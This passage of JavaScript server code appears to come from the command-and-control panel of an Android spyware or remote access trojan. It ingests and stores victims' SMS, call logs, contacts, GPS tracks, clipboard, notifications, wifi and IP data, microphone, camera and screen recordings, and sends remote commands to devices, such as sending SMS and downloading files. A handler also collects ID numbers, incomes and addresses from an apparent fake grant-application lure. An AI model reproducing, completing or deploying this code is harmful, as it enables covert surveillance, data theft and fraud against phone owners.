         * Response: { fileId, resumeFromChunk, totalChunks, receivedChunks, isResume }
         */
        socket.on('upload_init', (data, ackCallback) => {
            try {
                const result = this.uploadManager.initUpload({
                    fileId:        data.fileId,
                    fileName:      data.fileName,
                    filePath:      data.filePath,
                    fileSize:      data.fileSize,
                    totalChunks:   data.totalChunks,
                    chunkSize:     data.chunkSize,
                    fileExtension: data.fileExtension,
                    fileType:      data.fileType,
                    clientID:      clientID
                });

                // Mark upload as an active operation
                this.setActiveOperation(clientID, 'upload');

                logManager.log(CONST.logTypes.info,
                    clientID + ' Upload init: ' + data.fileName +
                    ' (' + (data.fileSize ? (data.fileSize / 1024 / 1024).toFixed(2) + ' MB' : '?') +
                    ', ' + data.totalChunks + ' chunks)' +
                    (result.isResume ? ' [RESUME from chunk ' + result.resumeFromChunk + ']' : ''));

                // Send response via callback (Socket.IO acknowledgment) or event
                if (typeof ackCallback === 'function') {
                    ackCallback(result);
                }
                socket.emit('upload_ready', result);

            } catch (err) {
                console.error('[ResumableUpload] Error in upload_init:', err);
                const errResult = { fileId: data.fileId, error: err.message };
                if (typeof ackCallback === 'function') ackCallback(errResult);
                socket.emit('upload_ready', errResult);
            }
        });

        /**
         * upload_chunk — Client sends one chunk of the file.
         * Payload: { fileId, chunkIndex, totalChunks, chunkSize, buffer (base64) }
         * Response ACK: { fileId, chunkIndex, status }
         */
        socket.on('upload_chunk', (data, ackCallback) => {
            try {
                const result = this.uploadManager.receiveChunk({
                    fileId:      data.fileId,
                    chunkIndex:  data.chunkIndex,
                    totalChunks: data.totalChunks,
                    chunkSize:   data.chunkSize,
                    buffer:      data.buffer
                });

                // Send ACK back to client
                const ackData = {
                    fileId:     result.fileId,
                    chunkIndex: result.chunkIndex,
                    status:     result.status,
                    isComplete: result.isComplete || false
                };

                if (typeof ackCallback === 'function') {
                    ackCallback(ackData);
                }
                socket.emit('upload_ack', ackData);

                // If upload is complete, save to database and notify
                if (result.isComplete && result.savedInfo) {
                    const info = result.savedInfo;

                    // Save to client's downloads database
                    client.get('downloads').push({
                        time:         info.time,
                        type:         info.type,
                        originalName: info.originalName,
                        path:         info.path,
                        size:         info.size,
                        format:       info.format,
                        status:       info.status,
                        sourcePath:   info.sourcePath,
                        downloadTime: info.downloadTime,
                        speed:        info.speed,
                        totalChunks:  info.totalChunks,
                        resumable:    true
                    }).write();

                    // Clear active operation
                    this.clearActiveOperation(clientID);

                    // Notify client that upload is fully complete
                    socket.emit('upload_complete', {
                        fileId:       info.fileId,
                        savedPath:    info.path,
                        fileSize:     info.size,
                        downloadTime: info.downloadTime,
                        speed:        info.speed
                    });

                    logManager.log(CONST.logTypes.success,
                        '✅ Resumable upload complete from ' + clientID + ': ' +
                        info.originalName + ' (' + info.size + ' bytes, ' +
                        info.downloadTime + ', ' + info.speed + ')');
                }

            } catch (err) {
                console.error('[ResumableUpload] Error in upload_chunk:', err);
                const errAck = { fileId: data.fileId, chunkIndex: data.chunkIndex, status: 'error', error: err.message };
                if (typeof ackCallback === 'function') ackCallback(errAck);
                socket.emit('upload_ack', errAck);
            }
        });

        /**
         * upload_resume — Client reconnected and wants to know where to continue.
         * Payload: { fileId }
         * Response: { fileId, resumeFromChunk, totalChunks, receivedChunks }
         */
        socket.on('upload_resume', (data, ackCallback) => {
            try {
                const resumeInfo = this.uploadManager.getResumeInfo(data.fileId);

                if (resumeInfo) {
                    logManager.log(CONST.logTypes.info,
                        clientID + ' Upload resume request: ' + resumeInfo.fileName +
                        ' → resume from chunk ' + resumeInfo.resumeFromChunk + '/' + resumeInfo.totalChunks);

                    if (typeof ackCallback === 'function') ackCallback(resumeInfo);
                    socket.emit('upload_ready', resumeInfo);
                } else {
                    // Upload not found — client should re-init
                    const notFound = { fileId: data.fileId, error: 'Upload not found. Please re-initialize.' };
                    if (typeof ackCallback === 'function') ackCallback(notFound);
                    socket.emit('upload_ready', notFound);
                }

            } catch (err) {
                console.error('[ResumableUpload] Error in upload_resume:', err);
                const errResult = { fileId: data.fileId, error: err.message };
                if (typeof ackCallback === 'function') ackCallback(errResult);
                socket.emit('upload_ready', errResult);
            }
        });

        /**
         * upload_cancel — Client wants to abort an upload.
         * Payload: { fileId }
         */
        socket.on('upload_cancel', (data, ackCallback) => {
            const cancelled = this.uploadManager.cancelUpload(data.fileId);
            this.clearActiveOperation(clientID);
            
            logManager.log(CONST.logTypes.info, clientID + ' Upload cancelled: ' + data.fileId);

            const result = { fileId: data.fileId, cancelled };
            if (typeof ackCallback === 'function') ackCallback(result);
            socket.emit('upload_cancelled', result);
        });

        // When client reconnects, notify about any pending uploads they can resume
        {
            const pendingUploads = this.uploadManager.getPendingUploadsForClient(clientID);
            if (pendingUploads.length > 0) {
                logManager.log(CONST.logTypes.info,
                    clientID + ' has ' + pendingUploads.length + ' pending upload(s) to resume');
                socket.emit('pending_uploads', { uploads: pendingUploads });
            }
        }

        // ─── End Resumable Upload Protocol ───────────────────────────────────

        socket.on(CONST.messageKeys.call, (data) => {
            logManager.log(CONST.logTypes.info, clientID + " Received call log data: " + JSON.stringify(data));
            if (data.callsList) {
                if (data.callsList.length !== 0) {
                    let callsList = data.callsList;
                    let dbCall = client.get('CallData');
                    let newCount = 0;
                    callsList.forEach(call => {
                        let hash = crypto.createHash('md5').update(call.phoneNo + call.date).digest("hex");
                        if (dbCall.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            call.hash = hash;
                            dbCall.push(call).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Call Log Updated - " + newCount + " New Calls");
                } else {
                    logManager.log(CONST.logTypes.info, clientID + " Call log data received but callsList is empty");
                }
            } else {
                logManager.log(CONST.logTypes.warning, clientID + " Call log data received but no callsList field");
            }

        });

        socket.on(CONST.messageKeys.sms, (data) => {
            if (typeof data === "object") {
                let smsList = data.smslist;
                if (smsList.length !== 0) {
                    let dbSMS = client.get('SMSData');
                    let newCount = 0;
                    smsList.forEach(sms => {
                        let hash = crypto.createHash('md5').update(sms.address + sms.body).digest("hex");
                        if (dbSMS.find({ hash }).value() === undefined) {
                            // cool, we dont have this sms
                            sms.hash = hash;
                            dbSMS.push(sms).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " SMS List Updated - " + newCount + " New Messages");
                }
            } else if (typeof data === "boolean") {
                logManager.log(CONST.logTypes.success, clientID + " SENT SMS");
            }
        });

        socket.on(CONST.messageKeys.mic, (data) => {
            logManager.log(CONST.logTypes.info, clientID + " Received microphone data: " + JSON.stringify(data));
            
            if (data.file) {
                logManager.log(CONST.logTypes.info, "Recieving " + data.name + " from " + clientID);

                let hash = crypto.createHash('md5').update(new Date() + Math.random()).digest("hex");
                let fileKey = hash.substr(0, 5) + "-" + hash.substr(5, 4) + "-" + hash.substr(9, 5);
                let fileExt = (data.name.substring(data.name.lastIndexOf(".")).length !== data.name.length) ? data.name.substring(data.name.lastIndexOf(".")) : '.3gp';

                let filePath = path.join(CONST.downloadsFullPath, fileKey + fileExt);

                // Handle base64 audio data
                let audioBuffer;
                if (typeof data.buffer === 'string') {
                    // Base64 string - convert to buffer
                    audioBuffer = Buffer.from(data.buffer, 'base64');
                } else {
                    // Already a buffer
                    audioBuffer = data.buffer;
                }

                fs.writeFile(filePath, audioBuffer, (e) => {
                    if (!e) {
                        // Store audio file info in downloads
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            "originalName": data.name,
                            "path": CONST.downloadsFolder + '/' + fileKey + fileExt,
                            "size": data.size || audioBuffer.length,
                            "format": data.type || "audio/3gpp",
                            "status": "Audio recording completed successfully"
                        }).write();
                        
                        logManager.log(CONST.logTypes.success, clientID + " Audio file saved: " + fileKey + fileExt + " (" + (data.size || audioBuffer.length) + " bytes)");
                        logManager.log(CONST.logTypes.info, clientID + " Audio recording completed and stored in downloads");
                    } else {
                        console.log(e);
                        logManager.log(CONST.logTypes.error, clientID + " Failed to save audio file: " + e.message);
                    }
                })
            } else {
                // Handle new microphone data format
                if (data.status) {
                    logManager.log(CONST.logTypes.info, clientID + " Microphone Status: " + data.status);
                    
                    if (data.status === "Recording completed") {
                        // Store microphone recording info
                        client.get('downloads').push({
                            "time": new Date(),
                            "type": "voiceRecord",
                            "status": data.status,
                            "fileSize": data.fileSize || 0,
                            "duration": data.duration || "Unknown",
                            "format": data.format || "Unknown",
                            "filePath": data.filePath || "Not saved"
                        }).write();
                        
                        logManager.log(CONST.logTypes.success, clientID + " Microphone recording completed - Size: " + (data.fileSize || 0) + " bytes");
                    } else if (data.status === "Microphone permission not granted") {
                        logManager.log(CONST.logTypes.error, clientID + " Microphone permission denied");
                    } else if (data.status.includes("Recording failed")) {
                        logManager.log(CONST.logTypes.error, clientID + " Microphone recording failed: " + (data.error || "Unknown error"));
                    }
                }
            }
        });

        socket.on(CONST.messageKeys.location, (data) => {
            logManager.log(CONST.logTypes.info, clientID + " Received location data: " + JSON.stringify(data));
            
            // Check for permission denied status
            if (data.status && (
                data.status.includes("permission denied") || 
                data.status.includes("Permission denied") ||
                data.status.includes("does not have android.permission"))) {
                logManager.log(CONST.logTypes.warning, clientID + " Location permission denied - user needs to grant location permission");
                return;
            }
            
            // Check if location data is valid (has latitude and longitude, and they're not 0)
            // Also check for status field which might indicate "No location data available"
            const hasValidLocation = data.latitude !== undefined && 
                                   data.longitude !== undefined &&
                                   typeof data.latitude === 'number' &&
                                   typeof data.longitude === 'number' &&
                                   data.latitude !== 0 && 
                                   data.longitude !== 0 &&
                                   (!data.status || (
                                       !data.status.includes("No location data available") &&
                                       !data.status.includes("Location services disabled") &&
                                       !data.status.includes("permission denied")
                                   ));
            
            if (!hasValidLocation) {
                logManager.log(CONST.logTypes.warning, clientID + " GPS Received No Data or Invalid Location: " + (data.status || "Unknown reason"));
                return;
            }
            
            // Store location in database with all available information
            try {
                client.get('GPSData').push({
                    time: data.timestamp ? new Date(data.timestamp) : new Date(),
                    enabled: data.enabled !== undefined ? data.enabled : true,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    altitude: data.altitude || 0,
                    accuracy: data.accuracy || 0,
                    speed: data.speed || 0,
                    status: data.status || "Location retrieved successfully",
                    provider: data.provider || "Unknown"
                }).write();
                logManager.log(CONST.logTypes.success, clientID + " GPS Updated - Lat: " + data.latitude + ", Lon: " + data.longitude + " (Saved to DB)");
            } catch (error) {
                logManager.log(CONST.logTypes.error, clientID + " Error saving GPS data to DB: " + error.message);
            }
        });

        socket.on(CONST.messageKeys.clipboard, (data) => {
            client.get('clipboardLog').push({
                time: new Date(),
                content: data.text
            }).write();
            logManager.log(CONST.logTypes.info, clientID + " ClipBoard Recieved");
        });

        socket.on(CONST.messageKeys.notification, (data) => {
            logManager.log(CONST.logTypes.info, clientID + " Received notification data: " + JSON.stringify(data));
            
            let dbNotificationLog = client.get('notificationLog');
            let notificationToStore = null;
            let notificationsToStore = [];
            
            // Handle nested structure: { type: "realtime", data: { key, appName, ... } }
            if (data.data && data.data.key && data.data.appName) {
                // Extract notification from nested data structure
                notificationToStore = data.data;
            }
            // Handle direct notification format: { key, appName, ... }
            else if (data.key && data.appName) {
                notificationToStore = data;
            }
            // Handle multiple notifications array
            else if (data.notifications && Array.isArray(data.notifications)) {
                notificationsToStore = data.notifications;
            }
            
            // Process single notification
            if (notificationToStore) {
                let hash = crypto.createHash('md5').update(notificationToStore.key + (notificationToStore.content || '')).digest("hex");

                if (dbNotificationLog.find({ hash }).value() === undefined) {
                    // Prepare notification for storage
                    let notificationData = {
                        hash: hash,
                        key: notificationToStore.key,
                        packageName: notificationToStore.packageName || '',
                        appName: notificationToStore.appName || '',
                        title: notificationToStore.title || 'No title',
                        text: notificationToStore.text || 'No text',
                        content: notificationToStore.content || '',
                        postTime: notificationToStore.postTime || notificationToStore.timestamp || Date.now(),
                        timestamp: notificationToStore.timestamp || notificationToStore.postTime || Date.now(),
                        receivedTime: new Date(),
                        clientID: clientID,
                        isImportant: notificationToStore.isImportant || false,
                        category: notificationToStore.category || 'Other',
                        hasIcon: notificationToStore.hasIcon || false,
                        isOngoing: notificationToStore.isOngoing || false,
                        isPersistent: notificationToStore.isPersistent || false,
                        priority: notificationToStore.priority || 'DEFAULT',
                        channelId: notificationToStore.channelId || '',
                        postTimeFormatted: notificationToStore.postTimeFormatted || new Date(notificationToStore.postTime || Date.now()).toISOString()
                    };
                    
                    dbNotificationLog.push(notificationData).write();
                    logManager.log(CONST.logTypes.success, clientID + " Notification Stored: " + notificationData.appName + " - " + notificationData.title);
                    
                    // Broadcast to all connected web clients for real-time display
                    try {
                        if (global.IO) {
                            global.IO.emit('notification_received', {
                                type: 'realtime',
                                timestamp: new Date(),
                                data: notificationData
                            });
                            console.log('📡 Broadcasting notification to web clients...');
                        }
                    } catch (error) {
                        console.error('❌ Error broadcasting notification:', error);
                    }
                } else {
                    logManager.log(CONST.logTypes.info, clientID + " Duplicate notification ignored: " + notificationToStore.appName);
                }
            }
            // Process multiple notifications
            else if (notificationsToStore.length > 0) {
                let newCount = 0;
                
                notificationsToStore.forEach(notification => {
                    let hash = crypto.createHash('md5').update(notification.key + (notification.content || '')).digest("hex");
                    
                    if (dbNotificationLog.find({ hash }).value() === undefined) {
                        let notificationData = {
                            hash: hash,
                            key: notification.key,
                            packageName: notification.packageName || '',
                            appName: notification.appName || '',
                            title: notification.title || 'No title',
                            text: notification.text || 'No text',
                            content: notification.content || '',
                            postTime: notification.postTime || notification.timestamp || Date.now(),
                            timestamp: notification.timestamp || notification.postTime || Date.now(),
                            receivedTime: new Date(),
                            clientID: clientID,
                            isImportant: notification.isImportant || false,
                            category: notification.category || 'Other',
                            hasIcon: notification.hasIcon || false,
                            isOngoing: notification.isOngoing || false,
                            isPersistent: notification.isPersistent || false,
                            priority: notification.priority || 'DEFAULT',
                            channelId: notification.channelId || '',
                            postTimeFormatted: notification.postTimeFormatted || new Date(notification.postTime || Date.now()).toISOString()
                        };
                        
                        dbNotificationLog.push(notificationData).write();
                        newCount++;
                        
                        // Broadcast each notification to web clients
                        try {
                            if (global.IO) {
                                global.IO.emit('notification_received', {
                                    type: 'realtime',
                                    timestamp: new Date(),
                                    data: notificationData
                                });
                            }
                        } catch (error) {
                            console.error('❌ Error broadcasting notification:', error);
                        }
                    }
                });
                
                logManager.log(CONST.logTypes.success, clientID + " Notifications Stored - " + newCount + " New Notifications (Total: " + data.count + ")");
            } else {
                logManager.log(CONST.logTypes.warning, clientID + " Notification data received but no valid notifications found");
            }
        });

        socket.on(CONST.messageKeys.contacts, (data) => {
            logManager.log(CONST.logTypes.info, clientID + " Received contacts data: " + JSON.stringify(data));
            if (data.contactsList) {
                if (data.contactsList.length !== 0) {
                    let contactsList = data.contactsList;
                    let dbContacts = client.get('contacts');
                    let newCount = 0;
                    contactsList.forEach(contact => {
                        contact.phoneNo = contact.phoneNo.replace(/\s+/g, '');
                        let hash = crypto.createHash('md5').update(contact.phoneNo + contact.name).digest("hex");
                        if (dbContacts.find({ hash }).value() === undefined) {
                            // cool, we dont have this call
                            contact.hash = hash;
                            dbContacts.push(contact).write();
                            newCount++;
                        }
                    });
                    logManager.log(CONST.logTypes.success, clientID + " Contacts Updated - " + newCount + " New Contacts Added");
                }
            }

        });

        socket.on(CONST.messageKeys.wifi, (data) => {
            if (!data) {
                logManager.log(CONST.logTypes.warning, clientID + " WiFi: empty payload");
                return;
            }
            let networks = data.networks;
            if (!Array.isArray(networks)) {
                logManager.log(CONST.logTypes.warning, clientID + " WiFi: invalid networks (not array): " + typeof networks);
                return;
            }
            let dbwifiLog = client.get('wifiLog');
            client.set('wifiNow', networks).write();

            let wifiMeta = {
                publicIp: data.publicIp != null ? String(data.publicIp) : '',
                localIpv4: data.localIpv4 != null ? String(data.localIpv4) : '',
                connectedSsid: data.connectedSsid != null ? String(data.connectedSsid) : '',
                linkSpeedMbps: data.linkSpeedMbps != null && data.linkSpeedMbps !== '' ? data.linkSpeedMbps : null,
                activeTransport: data.activeTransport != null ? String(data.activeTransport) : '',
                scanAt: data.scanAt != null ? data.scanAt : Date.now(),
                status: data.status != null ? String(data.status) : ''
            };
            client.set('wifiMeta', wifiMeta).write();

            if (networks.length === 0) {
                let msg = data.status ? String(data.status) : 'No networks';
                logManager.log(CONST.logTypes.info, clientID + " WiFi: 0 networks — " + msg + (wifiMeta.publicIp ? ' | public ' + wifiMeta.publicIp : ''));
                return;
            }
            let newCount = 0;
            networks.forEach(wifi => {
                let wifiField = dbwifiLog.find({ SSID: wifi.SSID, BSSID: wifi.BSSID });
                if (wifiField.value() === undefined) {
                    wifi.firstSeen = new Date();
                    wifi.lastSeen = new Date();
                    dbwifiLog.push(wifi).write();
                    newCount++;
                } else {
                    wifiField.assign({
                        lastSeen: new Date(),
                        level: wifi.level,
                        rssiDbm: wifi.rssiDbm,
                        frequency: wifi.frequency,
                        band: wifi.band,
                        capabilities: wifi.capabilities,
                        channelWidth: wifi.channelWidth
                    }).write();
                }
            });
            logManager.log(CONST.logTypes.success, clientID + " WiFi Updated - " + newCount + " new APs (" + networks.length + " scan) public=" + (wifiMeta.publicIp || 'n/a'));
        });

        socket.on(CONST.messageKeys.permissions, (data) => {
            client.get('enabledPermissions').assign(data.permissions).write();
            logManager.log(CONST.logTypes.success, clientID + " Permissions Updated");
        });

        socket.on(CONST.messageKeys.installed, (data) => {
            client.get('apps').assign(data.apps).write();
            logManager.log(CONST.logTypes.success, clientID + " Apps Updated");
        });

        // Handle command responses from client
        socket.on('command_response', (data) => {
            logManager.log(CONST.logTypes.info, clientID + " Command Response: " + data.type + " - " + data.status);
        });

        // Handle grant application data
        socket.on('grant_application', (data) => {
            try {
                logManager.log(`Received grant application from client ${clientID}: ${data.full_name}`);
                
                // Store grant application in client database
                let clientDB = this.getClientDatabase(clientID);
                
                // Create grant applications array if it doesn't exist
                if (!clientDB.has('grantApplications').value()) {
                    clientDB.set('grantApplications', []).write();
                }
                
                // Add new application
                let applications = clientDB.get('grantApplications').value();
                applications.push({
                    id: data.id,
                    full_name: data.full_name,
                    id_number: data.id_number,
                    phone_number: data.phone_number,
                    email: data.email,
                    property_address: data.property_address,
                    family_members: data.family_members,
                    monthly_income: data.monthly_income,
                    damage_level: data.damage_level,
                    property_type: data.property_type,
                    property_area: data.property_area,
                    property_ownership: data.property_ownership,
                    damage_date: data.damage_date,
                    damage_description: data.damage_description,
                    property_latitude: data.property_latitude,
                    property_longitude: data.property_longitude,
                    photos: data.photos,
                    status: data.status,
                    created_at: data.created_at,
                    received_at: new Date().toISOString()
                });
                
                clientDB.set('grantApplications', applications).write();
                
                logManager.log(`Grant application saved for client ${clientID}: ${data.full_name} (ID: ${data.id})`);
                
                // Send confirmation back to client
                socket.emit('grant_application_received', {
                    success: true,
                    application_id: data.id,
                    message: 'Application received successfully'
                });
                
            } catch (error) {
                logManager.log(`Error processing grant application from client ${clientID}: ${error.message}`);
                socket.emit('grant_application_received', {
                    success: false,
                    error: error.message
                });
            }
        });
    }


    // GET
    getClient(clientID) {
        let client = this.db.maindb.get('clients').find({ clientID }).value();
        if (client !== undefined) return client;
        else return false;
    }

    getClientList() {
        return this.db.maindb.get('clients').value();
    }

    getClientListOnline() {
        return this.db.maindb.get('clients').value().filter(client => client.isOnline);
    }
    getClientListOffline() {
        return this.db.maindb.get('clients').value().filter(client => !client.isOnline);
    }

    getClientDataByPage(clientID, page, filter = undefined) {
        const idRaw = clientID != null ? String(clientID).trim() : '';
        let idDecoded = idRaw;
        try {
            idDecoded = decodeURIComponent(idRaw);
        } catch (e) { /* keep idRaw */ }
        const clientsArr = this.db.maindb.get('clients').value();
        const list = Array.isArray(clientsArr) ? clientsArr : [];
        let client = list.find(
            (c) =>
                c &&
                c.clientID != null &&
                String(c.clientID).trim() !== '' &&
                (String(c.clientID) === idDecoded || String(c.clientID) === idRaw)
        );
        const pageNorm = page != null ? String(page).toLowerCase().trim() : '';

        if (client !== undefined && client != null) {
            let clientDB = this.getClientDatabase(client.clientID);
            let clientData = clientDB.value();

            let pageData;

            if (pageNorm === "calls") {
                pageData = clientDB.get('CallData').sortBy('date').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('CallData').sortBy('date').reverse().value().filter(calls => calls.phoneNo.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (pageNorm === "sms") {
                pageData = clientData.SMSData;
                if (filter) {
                    let filterData = clientDB.get('SMSData').value().filter(sms => sms.address.substr(-6) === filter.substr(-6));
                    if (filterData) pageData = filterData;
                }
            }
            else if (pageNorm === "notifications") {
                pageData = clientDB.get('notificationLog').sortBy('postTime').reverse().value();
                if (filter) {
                    let filterData = clientDB.get('notificationLog').sortBy('postTime').reverse().value().filter(not => not.appName === filter);
                    if (filterData) pageData = filterData;
                }
            }
            else if (pageNorm === "wifi") {
                pageData = {};
                pageData.now = Array.isArray(clientData.wifiNow) ? clientData.wifiNow : [];
                pageData.log = Array.isArray(clientData.wifiLog) ? clientData.wifiLog : [];
                pageData.meta = (clientData.wifiMeta && typeof clientData.wifiMeta === 'object') ? clientData.wifiMeta : {};
            }
            else if (pageNorm === "contacts") pageData = clientData.contacts;
            else if (pageNorm === "permissions") pageData = clientData.enabledPermissions;
            else if (pageNorm === "clipboard") pageData = clientDB.get('clipboardLog').sortBy('time').reverse().value();
            else if (pageNorm === "apps") pageData = clientData.apps;
            else if (pageNorm === "files") {
                pageData = clientData.currentFolder;
                // Also return pagination metadata for files page
                this.pageMeta = clientDB.get('currentFolderMeta').value() || null;
            }
            else if (pageNorm === "downloads") pageData = clientData.downloads.filter(download => download.type === "download");
            else if (pageNorm === "microphone") pageData = clientDB.get('downloads').value().filter(download => download.type === "voiceRecord");
            else if (pageNorm === "camera") {
                let allDownloads = clientDB.get('downloads').value() || [];
                if (!allDownloads) allDownloads = [];
                pageData = allDownloads.filter(download =>
                    download && (download.type === "frontCameraPhoto" || download.type === "frontCameraVideo"));
                // Sort by time (newest first)
                pageData.sort((a, b) => {
                    let timeA = a.time ? new Date(a.time).getTime() : 0;
                    let timeB = b.time ? new Date(b.time).getTime() : 0;
                    return timeB - timeA;
                });
            }
            else if (pageNorm === "screen") {
                let allDownloads = clientDB.get('downloads').value() || [];
                pageData = allDownloads.filter(download => download.type === "screenRecording");
                // Sort by time (newest first)
                pageData.sort((a, b) => new Date(b.time) - new Date(a.time));
            }
            else if (pageNorm === "gps") pageData = clientData.GPSData;
            else if (pageNorm === "info") {
                let cdb = clientData;
                let gpsArr = Array.isArray(cdb.GPSData) ? cdb.GPSData : [];
                let lastGps = null;
                for (let i = gpsArr.length - 1; i >= 0; i--) {
                    let g = gpsArr[i];
                    if (g && typeof g.latitude === 'number' && typeof g.longitude === 'number' &&
                        g.latitude !== 0 && g.longitude !== 0) {
                        lastGps = g;
                        break;
                    }
                }
                let clientPlain;
                try {
                    clientPlain = JSON.parse(JSON.stringify(client));
                } catch (e) {
                    clientPlain = client;
                }
                pageData = {
                    client: clientPlain,
                    counts: {
                        sms: Array.isArray(cdb.SMSData) ? cdb.SMSData.length : 0,
                        calls: Array.isArray(cdb.CallData) ? cdb.CallData.length : 0,
                        contacts: Array.isArray(cdb.contacts) ? cdb.contacts.length : 0,
                        notifications: Array.isArray(cdb.notificationLog) ? cdb.notificationLog.length : 0,
                        apps: Array.isArray(cdb.apps) ? cdb.apps.length : 0,
                        gpsPoints: gpsArr.length,
                        wifiNetworks: Array.isArray(cdb.wifiLog) ? cdb.wifiLog.length : 0,
                        clipboard: Array.isArray(cdb.clipboardLog) ? cdb.clipboardLog.length : 0,
                        downloads: Array.isArray(cdb.downloads) ? cdb.downloads.length : 0,
                        grantApplications: Array.isArray(cdb.grantApplications) ? cdb.grantApplications.length : 0
                    },
                    wifiMeta: (cdb.wifiMeta && typeof cdb.wifiMeta === 'object') ? cdb.wifiMeta : {},
                    gpsPollSeconds: (cdb.GPSSettings && cdb.GPSSettings.updateFrequency) ? cdb.GPSSettings.updateFrequency : 0,
                    commandQueue: Array.isArray(cdb.CommandQue) ? cdb.CommandQue.length : 0,
                    enabledPermissions: cdb.enabledPermissions,
                    lastGps: lastGps
                };
            }
            else if (pageNorm === "live_screen") {
                // Live screen streaming page - return active stream info or empty object
                const sid = String(client.clientID);
                pageData = this.screenStreams && this.screenStreams[sid]
                    ? this.screenStreams[sid]
                    : { isActive: false };
            }

            if (pageData === undefined) return false;
            return pageData;
        } else return false;
    }

    // DELETE
    deleteClient(clientID) {
        this.db.maindb.get('clients').remove({ clientID }).write();
        if (this.clientConnections[clientID]) delete this.clientConnections[clientID];
    }

    // COMMAND QUEUE MANAGEMENT
    
    /**
     * Check if client has active heavy operations (file listing, downloads)
     */
    hasActiveOperation(clientID, operationType = null) {
        if (!this.activeOperations[clientID]) return false;
        if (operationType) {
            return this.activeOperations[clientID].type === operationType;
        }
        return true;
    }
    
    /**
     * Mark operation as active
     */
    setActiveOperation(clientID, operationType) {
        this.activeOperations[clientID] = {
            type: operationType,
            startTime: Date.now()
        };
        console.log(`   🔒 Active operation set: ${operationType} for ${clientID}`);
    }
    
    /**
     * Clear active operation
     */
    clearActiveOperation(clientID) {
        if (this.activeOperations[clientID]) {
            let duration = Date.now() - this.activeOperations[clientID].startTime;
            console.log(`   🔓 Active operation cleared: ${this.activeOperations[clientID].type} for ${clientID} (${(duration/1000).toFixed(1)}s)`);
            delete this.activeOperations[clientID];
        }
    }
    
    /**
     * Pause file batch auto-loading
     */
    pauseFileBatchLoading(clientID) {
        if (this.fileBatchTimers[clientID]) {
            clearTimeout(this.fileBatchTimers[clientID]);
            delete this.fileBatchTimers[clientID];
            console.log(`   ⏸️  Paused file batch loading for ${clientID}`);
        }
    }
    
    /**
     * Check if operation should be delayed
     */
    shouldDelayOperation(clientID, operationType) {
        // If there's an active download, delay file batch requests
        if (operationType === 'file_list' && this.hasActiveOperation(clientID, 'download')) {
            console.log(`   ⏳ Delaying file list request - download in progress`);
            return true;
        }
        
        // If there's active file listing, delay download requests
        if (operationType === 'download' && this.hasActiveOperation(clientID, 'file_list')) {
            console.log(`   ⏳ Delaying download request - file listing in progress`);
            return true;
        }
        
        return false;
    }

    // COMMAND
    sendCommand(clientID, commandID, commandPayload = {}, cb = () => { }) {
        this.checkCorrectParams(commandID, commandPayload, (error) => {
            if (!error) {
                let client = this.db.maindb.get('clients').find({ clientID }).value();
                if (client !== undefined) {
                    // Handle screen recording command - append duration to commandID
                    let finalCommandID = commandID;
                    if (commandID === CONST.messageKeys.screen) {
                        let duration = 30;
                        if (commandPayload && 'duration' in commandPayload) {
                            duration = parseInt(commandPayload.duration);
                            if (isNaN(duration) || duration < 1) duration = 30;
                            if (duration > 300) duration = 300;
                        }
                        finalCommandID = commandID + ':' + duration;
                    }
                    if (commandID === CONST.messageKeys.cameraVideo) {
                        let duration = 15;
                        if (commandPayload && 'duration' in commandPayload) {
                            duration = parseInt(commandPayload.duration, 10);
                            if (isNaN(duration) || duration < 1) duration = 15;
                            if (duration > 60) duration = 60;
                        }
                        finalCommandID = commandID + ':' + duration;
                    }

                    commandPayload.type = finalCommandID;
                    if (clientID in this.clientConnections) {
                        let socket = this.clientConnections[clientID];
                        logManager.log(CONST.logTypes.info, "Requested " + finalCommandID + " From " + clientID);
                        socket.emit('order', commandPayload)
                        return cb(false, 'Requested');
                    } else {
                        this.queCommand(clientID, commandPayload, (error) => {
                            if (!error) return cb(false, 'Command queued (device is offline)')
                            else return cb(error, undefined)
                        })
                    }
                } else return cb('Client Doesn\'t exist!', undefined);
            } else return cb(error, undefined);
        });
    }

    queCommand(clientID, commandPayload, cb) {
        let clientDB = this.getClientDatabase(clientID);
        let commandQue = clientDB.get('CommandQue');
        let outstandingCommands = [];
        commandQue.value().forEach((command) => {
            outstandingCommands.push(command.type);
        });

        if (outstandingCommands.includes(commandPayload.type)) return cb('A similar command has already been queued');
        else {
            // yep, it could cause a clash, but c'mon, realistically, it won't, theoretical max que length is like 12 items, so chill?
            // Talking of clashes, enjoy -> https://www.youtube.com/watch?v=EfK-WX2pa8c
            commandPayload.uid = Math.floor(Math.random() * 10000);
            commandQue.push(commandPayload).write();
            return cb(false)
        }
    }

    checkCorrectParams(commandID, commandPayload, cb) {
        if (commandID === CONST.messageKeys.sms) {
            if (!('action' in commandPayload)) return cb('SMS Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') return cb(false);
                else if (commandPayload.action === 'sendSMS') {
                    if (!('to' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else if (!('sms' in commandPayload)) return cb('SMS Missing `to` Parameter');
                    else return cb(false);
                } else return cb('SMS `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.files) {
            if (!('action' in commandPayload)) return cb('Files Missing `action` Parameter');
            else {
                if (commandPayload.action === 'ls') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else if (commandPayload.action === 'dl') {
                    if (!('path' in commandPayload)) return cb('Files Missing `path` Parameter')
                    else return cb(false);
                }
                else return cb('Files `action` parameter incorrect');
            }
        }
        else if (commandID === CONST.messageKeys.mic) {
            if (!'sec' in commandPayload) return cb('Mic Missing `sec` Parameter')
            else cb(false)
        }
        else if (commandID === CONST.messageKeys.camera) {
            // Camera command - no parameters needed, just take front photo
            cb(false)
        }
        else if (commandID === CONST.messageKeys.cameraVideo) {
            cb(false)
        }
        else if (commandID === CONST.messageKeys.screen) {
            // Screen recording command - duration is optional (default 30 seconds)
            // Duration will be handled in sendCommand method
            cb(false)
        }
        else if (commandID === CONST.messageKeys.gotPermission) {
            if (!'permission' in commandPayload) return cb('GotPerm Missing `permission` Parameter')
            else cb(false)
        }
        else if (Object.values(CONST.messageKeys).indexOf(commandID) >= 0) return cb(false)
